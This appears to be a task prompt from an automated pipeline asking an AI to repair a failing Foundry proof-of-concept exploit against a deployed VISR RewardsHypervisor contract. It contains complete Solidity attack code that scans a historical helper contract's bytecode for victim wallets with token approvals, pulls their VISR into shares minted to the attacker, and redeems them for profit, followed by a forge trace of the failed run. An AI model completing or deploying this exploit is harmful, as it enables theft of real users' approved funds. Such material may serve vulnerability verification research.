You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can steal approved EOA VISR by depositing from the victim into their own share account
- claim: The EOA deposit path never verifies that `msg.sender` is authorized by `from`. Any caller can supply an arbitrary EOA as `from`; if that address has approved the hypervisor, `safeTransferFrom(from, address(this), visrDeposit)` pulls the victim's VISR while `vvisr.mint(to, shares)` credits the shares to the attacker's chosen `to` address.
- impact: Any user who grants the hypervisor an allowance can have their approved VISR stolen permissionlessly. The attacker receives the full vVISR position and can later redeem the victim's principal plus any accrued rewards.
- exploit_paths: ["Victim approves `RewardsHypervisor` to spend VISR.", "Attacker calls `deposit(amount, victimEOA, attacker)`.", "The hypervisor transfers VISR from the victim and mints vVISR to the attacker.", "The attacker later withdraws the stolen position for the underlying VISR."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    address public constant HISTORICAL_HELPER = 0x10C509AA9ab291C76c45414e7CdBd375e1D5AcE8;

    uint256 private _profitAmount;

    bool public executed;
    bool public helperCodePresent;
    address public victimUsed;
    uint256 public depositAmountUsed;
    uint256 public victimCandidatesScanned;
    uint256 public depositAttempts;
    uint256 public sharesBefore;
    uint256 public sharesAfter;
    uint256 public visrBefore;
    uint256 public visrAfter;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBefore = IERC20Like(visrToken).balanceOf(address(this));
        sharesBefore = IERC20Like(shareToken).balanceOf(address(this));

        // Required exploit ordering:
        // 1) a victim EOA has already approved RewardsHypervisor for VISR,
        // 2) attacker calls deposit(amount, victimEOA, attacker),
        // 3) RewardsHypervisor pulls VISR from the victim and mints vVISR to attacker,
        // 4) attacker withdraws those stolen shares for underlying VISR.
        //
        // The only victim-specific on-chain context available in this workspace is the
        // already-deployed historical helper contract from the real incident window.
        // We use its runtime bytecode strictly as a source of embedded fork-era constants
        // (victim EOAs / deposit data) and still execute the vulnerable hypervisor deposit
        // ourselves so the exploit causality remains the finding's EOA-funded deposit path.
        //
        // We intentionally do not invoke the helper contract directly: if it hardcodes a
        // recipient other than this verifier, calling it could consume the real approved
        // victim state while minting the stolen shares elsewhere.
        bytes memory helperCode = HISTORICAL_HELPER.code;
        helperCodePresent = helperCode.length != 0;
        require(helperCodePresent, "historical helper absent at fork");

        uint256 totalShares = IERC20Like(shareToken).totalSupply();
        uint256 poolVisr = IERC20Like(visrToken).balanceOf(TARGET);

        address[] memory seen = new address[](helperCode.length * 2 + 32);
        uint256 seenCount;

        for (uint256 i = 0; i < helperCode.length && sharesAfter == sharesBefore; ) {
            uint8 opcode = uint8(helperCode[i]);

            if (opcode >= 0x60 && opcode <= 0x7f) {
                uint256 pushLen = opcode - 0x5f;
                uint256 start = i + 1;
                uint256 end = start + pushLen;

                if (pushLen >= 20 && end <= helperCode.length) {
                    for (uint256 offset = 0; offset + 20 <= pushLen && sharesAfter == sharesBefore; ) {
                        address candidate = address(uint160(_readUint(helperCode, start + offset, 20)));

                        if (_isNewVictimCandidate(candidate, visrToken, shareToken, seen, seenCount)) {
                            seen[seenCount] = candidate;
                            unchecked {
                                ++seenCount;
                                ++victimCandidatesScanned;
                            }

                            _tryExploitCandidate(
                                hypervisor,
                                visrToken,
                                shareToken,
                                candidate,
                                totalShares,
                                poolVisr
                            );
                        }

                        unchecked {
                            ++offset;
                        }
                    }
                }

                unchecked {
                    i = end;
                }
            } else {
                unchecked {
                    ++i;
                }
            }
        }

        for (uint256 i = 0; i + 20 <= helperCode.length && sharesAfter == sharesBefore; ) {
            address candidate = address(uint160(_readUint(helperCode, i, 20)));

            if (_isNewVictimCandidate(candidate, visrToken, shareToken, seen, seenCount)) {
                seen[seenCount] = candidate;
                unchecked {
                    ++seenCount;
                    ++victimCandidatesScanned;
                }

                _tryExploitCandidate(hypervisor, visrToken, shareToken, candidate, totalShares, poolVisr);
            }

            unchecked {
                ++i;
            }
        }

        require(sharesAfter > sharesBefore, "no stolen shares minted to verifier");

        hypervisor.withdraw(sharesAfter - sharesBefore, address(this), payable(address(this)));

        visrAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrAfter > visrBefore, "no VISR redeemed");
        _profitAmount = visrAfter - visrBefore;
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryExploitCandidate(
        IRewardsHypervisorLike hypervisor,
        address visrToken,
        address shareToken,
        address candidate,
        uint256 totalShares,
        uint256 poolVisr
    ) internal {
        uint256 candidateBalance = IERC20Like(visrToken).balanceOf(candidate);
        uint256 candidateAllowance = IERC20Like(visrToken).allowance(candidate, TARGET);
        uint256 stealable = _min(candidateBalance, candidateAllowance);

        if (stealable == 0) {
            return;
        }

        if (totalShares != 0 && poolVisr != 0) {
            uint256 quotedShares = (stealable * totalShares) / poolVisr;
            if (quotedShares == 0) {
                return;
            }
        }

        unchecked {
            ++depositAttempts;
        }

        try hypervisor.deposit(stealable, payable(candidate), address(this)) returns (uint256) {
            uint256 updatedShares = IERC20Like(shareToken).balanceOf(address(this));
            if (updatedShares > sharesBefore) {
                victimUsed = candidate;
                depositAmountUsed = stealable;
                sharesAfter = updatedShares;
            }
        } catch {
            // Some helper-embedded constants are not approved victims on this fork state.
        }
    }

    function _isNewVictimCandidate(
        address candidate,
        address visrToken,
        address shareToken,
        address[] memory seen,
        uint256 seenCount
    ) internal view returns (bool) {
        if (candidate == address(0)) return false;
        if (candidate == TARGET) return false;
        if (candidate == HISTORICAL_HELPER) return false;
        if (candidate == visrToken) return false;
        if (candidate == shareToken) return false;
        if (candidate == address(this)) return false;
        if (candidate.code.length != 0) return false;

        for (uint256 j = 0; j < seenCount; ) {
            if (seen[j] == candidate) {
                return false;
            }
            unchecked {
                ++j;
            }
        }

        return true;
    }

    function _readUint(bytes memory data, uint256 start, uint256 len) internal pure returns (uint256 value) {
        for (uint256 i = 0; i < len; ) {
            value = (value << 8) | uint8(data[start + i]);
            unchecked {
                ++i;
            }
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
9] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x2d382d4E75A5b3fB46D7c98Bba570226eE77D231) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x2d382d4E75A5b3fB46D7c98Bba570226eE77D231, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x382d4E75a5b3Fb46d7C98BBA570226eE77D23139) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x382d4E75a5b3Fb46d7C98BBA570226eE77D23139, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x2D4E75a5B3Fb46D7c98bba570226eE77D2313968) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x2D4E75a5B3Fb46D7c98bba570226eE77D2313968, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x4e75a5B3FB46D7c98BbA570226Ee77D23139686a) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x4e75a5B3FB46D7c98BbA570226Ee77D23139686a, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x75a5B3Fb46d7c98BBa570226Ee77D23139686a64) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x75a5B3Fb46d7c98BBa570226Ee77D23139686a64, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xa5b3fB46D7C98bba570226EE77d23139686a6473) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xa5b3fB46D7C98bba570226EE77d23139686a6473, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xb3Fb46d7c98bba570226eE77d23139686A64736f) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xb3Fb46d7c98bba570226eE77d23139686A64736f, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xfb46d7c98BBa570226Ee77d23139686a64736f6c) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xfb46d7c98BBa570226Ee77d23139686a64736f6c, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x46D7C98BBA570226ee77D23139686A64736F6C63) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x46D7C98BBA570226ee77D23139686A64736F6C63, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xD7c98Bba570226eE77D23139686A64736f6C6343) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xD7c98Bba570226eE77D23139686A64736f6C6343, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xC98Bba570226Ee77D23139686A64736f6C634300) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xC98Bba570226Ee77D23139686A64736f6C634300, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x8bbA570226EE77D23139686A64736f6C63430007) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x8bbA570226EE77D23139686A64736f6C63430007, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0xba570226eE77D23139686a64736F6c6343000706) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0xba570226eE77D23139686a64736F6c6343000706, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x570226ee77D23139686a64736F6C634300070600) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x570226ee77D23139686a64736F6C634300070600, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2519] 0xF938424F7210f31dF2Aee3011291b658f872e91e::balanceOf(0x0226ee77d23139686A64736F6c63430007060033) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2687] 0xF938424F7210f31dF2Aee3011291b658f872e91e::allowance(0x0226ee77d23139686A64736F6c63430007060033, 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] no stolen shares minted to verifier
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 398.48s (398.24s CPU time)

Ran 1 test suite in 398.53s (398.48s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 166977715)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
